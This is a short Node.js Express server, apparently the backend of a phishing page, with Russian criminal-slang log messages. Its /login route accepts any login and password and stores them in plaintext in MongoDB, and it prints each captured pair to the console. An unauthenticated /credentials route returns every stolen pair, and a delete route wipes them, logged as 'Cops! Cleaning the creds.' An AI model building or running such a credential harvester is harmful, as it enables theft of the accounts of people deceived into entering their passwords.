const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
const app = express();
const port = 3000;
const dotenv = require('dotenv');

dotenv.config();

const MONGO_URI = process.env.MONGO_URI;
const MONGO_COLLECTION = process.env.MONGO_COLLECTION;

mongoose.connect(MONGO_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
})
    .then(() => console.log('С монго связь!\nЗапросы вентилируются...'))
    .catch((error) => console.error('Ошибка подключения к MongoDB:', error));


const userSchema = new mongoose.Schema({
    login: String,
    password: String,
},{
    timestamps: true
});

const User = mongoose.model('User', userSchema, MONGO_COLLECTION);

app.use(cors());
app.use(express.json());

app.post('/login', async (req, res) => {
    console.log('Вентилируем запрос...')
    const { login, password } = req.body;
    if (login && password) {
        console.log(`Малява верная, касатик -  ${login}`)
        try {
            const newUser = new User({ login: login.trim(), password: password.trim() });
            await newUser.save();
            res.status(200).send(`Пользователь с логином ${login} успешно сохранён в базе данных.`);
            console.log(`Вписан в хату: ${newUser.login}:${newUser.password}`);
        } catch (error) {
            res.status(500).send('Ошибка при сохранении пользователя в базу данных.');
        }
    } else {
        console.log(`Малява мусорская`)
        res.status(400).send('Необходимо указать логин и пароль.');
    }
});

app.get('/credentials', async (req, res) => {
    console.log('Вентилируем запрос на креды...')
        try {
            const users = await User.find({}, 'login password createdAt');
            res.status(200).send(users);
        } catch (error) {
            res.status(500).send('Ошибка при получении кредов.');
        }
});

app.delete('/credentials', async (req, res) => {
    console.log('Мусора! Чистим креды...')
    try {
        await User.deleteMany();
        res.status(200).send();
    } catch (error) {
        res.status(500).send('Ошибка при удалении кредов.');
    }
});

app.listen(port, () => {
    console.log(`Кинули ухо http://localhost:${port}`);
});
